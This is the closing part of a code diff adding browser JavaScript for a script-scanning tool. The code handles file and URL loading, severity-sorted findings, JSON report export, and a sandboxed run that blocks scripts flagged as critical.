+document.getElementById("fileInput").addEventListener("change", (e) => {
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = () => { editor.value = reader.result; syncGutter(); };
+  reader.readAsText(file);
+});
+
+document.getElementById("fetchUrlBtn").addEventListener("click", async () => {
+  const url = document.getElementById("urlInput").value.trim();
+  const statusEl = document.getElementById("fetchStatus");
+  if(!url){ statusEl.textContent = "Enter a URL first."; return; }
+  statusEl.textContent = "Fetching…";
+  try{
+    const res = await fetch(url);
+    if(!res.ok) throw new Error("HTTP " + res.status);
+    const text = await res.text();
+    editor.value = text;
+    syncGutter();
+    statusEl.textContent = `Loaded ${text.length} characters from ${url}. Nothing was executed — run the scanner next.`;
+  } catch(err){
+    statusEl.textContent = "Could not fetch that URL directly — most sites block cross-origin requests (CORS). Try a raw-content link (e.g. a GitHub \"raw\" file URL) or paste the script into the editor instead.";
+  }
+});
+
+/* ---- tabs ---- */
+document.querySelectorAll(".tab").forEach(tab => {
+  tab.addEventListener("click", () => {
+    document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+    document.querySelectorAll(".tab-content").forEach(c=>c.classList.remove("active"));
+    tab.classList.add("active");
+    document.getElementById("tab-" + tab.dataset.tab).classList.add("active");
+  });
+});
+
+/* ---- scan ---- */
+let lastFindings = [];
+function renderFindings(findings){
+  lastFindings = findings;
+  const overall = overallSeverity(findings);
+  const badge = document.getElementById("overallBadge");
+  badge.className = "risk-badge risk-" + overall;
+  badge.textContent = overall + (findings.length ? ` · ${findings.length} finding(s)` : " · clean");
+
+  const counts = Object.fromEntries(SEVERITY_ORDER.map(s=>[s,0]));
+  findings.forEach(f => counts[f.severity]++);
+  SEVERITY_ORDER.forEach(s => document.getElementById("chip"+s).textContent = `${s} ${counts[s]}`);
+
+  const list = document.getElementById("findingsList");
+  list.innerHTML = "";
+  if(findings.length === 0){
+    list.innerHTML = `<div class="empty-note">No issues found. Script looks clean.</div>`;
+  } else {
+    [...findings].sort((a,b)=> SEVERITY_RANK[b.severity]-SEVERITY_RANK[a.severity] || a.line_no-b.line_no)
+      .forEach(f => {
+        const div = document.createElement("div");
+        div.className = "finding sev-" + f.severity;
+        div.innerHTML = `
+          <div class="finding-top"><span>${f.severity} · line ${f.line_no} · ${f.command}</span></div>
+          <div class="finding-line">${escapeHtml(f.line.trim())}</div>
+          <div class="finding-reason">${escapeHtml(f.reason)}</div>`;
+        list.appendChild(div);
+      });
+  }
+  document.getElementById("downloadReportBtn").disabled = false;
+  document.getElementById("lastRunNote").textContent = `scan · ${new Date().toLocaleTimeString()}`;
+}
+function escapeHtml(s){
+  const d = document.createElement("div"); d.textContent = s; return d.innerHTML;
+}
+
+document.getElementById("scanBtn").addEventListener("click", () => {
+  const findings = currentLang() === "r" ? scanRScript(editor.value) : scanScript(editor.value);
+  renderFindings(findings);
+  document.querySelector('.tab[data-tab="scan"]').click();
+});
+
+document.getElementById("downloadReportBtn").addEventListener("click", () => {
+  const report = { language: currentLang(), overall_severity: overallSeverity(lastFindings), findings: lastFindings, generated: new Date().toISOString() };
+  const blob = new Blob([JSON.stringify(report, null, 2)], {type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "achilles_shield_scan_report.json";
+  a.click();
+});
+
+/* ---- sandbox ---- */
+document.getElementById("runBtn").addEventListener("click", () => {
+  if(currentLang() === "r"){
+    document.querySelector('.tab[data-tab="sandbox"]').click();
+    consoleEl.innerHTML = "";
+    const div = document.createElement("div");
+    div.className = "line-sys";
+    div.textContent = "R has no in-browser runtime, so sandboxed execution isn't available for R scripts. Use Run Static Scan instead — it covers the full risk analysis.";
+    consoleEl.appendChild(div);
+    return;
+  }
+  const findings = scanScript(editor.value);
+  renderFindings(findings);
+  const overall = overallSeverity(findings);
+  const allowCritical = document.getElementById("allowCritical").checked;
+  document.querySelector('.tab[data-tab="sandbox"]').click();
+  if(overall === "CRITICAL" && !allowCritical){
+    consoleEl.innerHTML = "";
+    const div = document.createElement("div");
+    div.className = "line-block";
+    div.textContent = "Refusing to run: static scan found CRITICAL risk findings. Check \"allow CRITICAL\" to override (sandbox still prevents any real file access).";
+    consoleEl.appendChild(div);
+    return;
+  }
+  runSandbox(editor.value, consoleEl);
+});
+
+document.getElementById("resetSandboxBtn").addEventListener("click", () => {
+  virtualFS = {};
+  renderFsTree();
+});
+
+function renderFsTree(){
+  const names = Object.keys(virtualFS);
+  if(names.length === 0){
+    fsTreeEl.innerHTML = `<div class="empty-note">Sandbox filesystem is empty.</div>`;
+    return;
+  }
+  fsTreeEl.innerHTML = "";
+  names.forEach(name => {
+    const div = document.createElement("div");
+    div.className = "fs-file";
+    div.innerHTML = `<span class="fs-file-name">${escapeHtml(name)}</span> <span style="color:var(--bone-dim)">(${virtualFS[name].length} bytes)</span>
+      <div class="fs-preview">${escapeHtml(virtualFS[name])}</div>`;
+    div.addEventListener("click", () => div.classList.toggle("open"));
+    fsTreeEl.appendChild(div);
+  });
+}
+
+</script>
+</body>
+</html>
